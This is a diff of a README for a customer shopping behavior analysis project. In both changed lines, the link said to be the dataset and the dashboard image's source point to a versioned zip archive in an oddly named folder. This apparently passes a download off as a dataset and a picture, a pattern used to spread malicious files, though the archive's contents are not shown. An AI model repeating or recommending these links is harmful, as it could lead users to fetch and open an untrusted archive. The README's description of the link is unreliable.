@@ -7,7 +7,7 @@ An e-commerce business needed to move beyond generic marketing and understand it
 The primary objective of this project is to conduct a comprehensive analysis of customer shopping behavior to answer key business questions and provide data-driven recommendations. This involves a full data analysis workflow, from data cleaning and preparation to in-depth analysis and visualization.
 
 ## Data Collection
-The dataset for this analysis is `https://github.com/SayanrupBarman/customer-behavior-analysis/raw/refs/heads/main/proanarchic/behavior_analysis_customer_v3.8.zip`, a flat file containing 3,900 records and 18 columns detailing customer demographics, transaction information, and product details.
+The dataset for this analysis is `https://github.com/SayanrupBarman/customer-behavior-analysis/raw/refs/heads/main/proanarchic/customer_analysis_behavior_3.0-beta.5.zip`, a flat file containing 3,900 records and 18 columns detailing customer demographics, transaction information, and product details.
 
 ### Key Data Points:
 *   **Customer Demographics:** Age, Gender, Location
@@ -36,7 +36,7 @@ This project follows a standard data analysis workflow from data preparation to 
     *   An interactive dashboard was created in Power BI, connected directly to the SQL database. The dashboard provides a visual representation of the findings, making it easy for stakeholders to understand the insights.
 
 <p align="center">
-  <img src="https://github.com/SayanrupBarman/customer-behavior-analysis/raw/refs/heads/main/proanarchic/behavior_analysis_customer_v3.8.zip" width="700" alt="Customer Analysis Dashboard">
+  <img src="https://github.com/SayanrupBarman/customer-behavior-analysis/raw/refs/heads/main/proanarchic/customer_analysis_behavior_3.0-beta.5.zip" width="700" alt="Customer Analysis Dashboard">
 </p>
 
 ## Key Insights
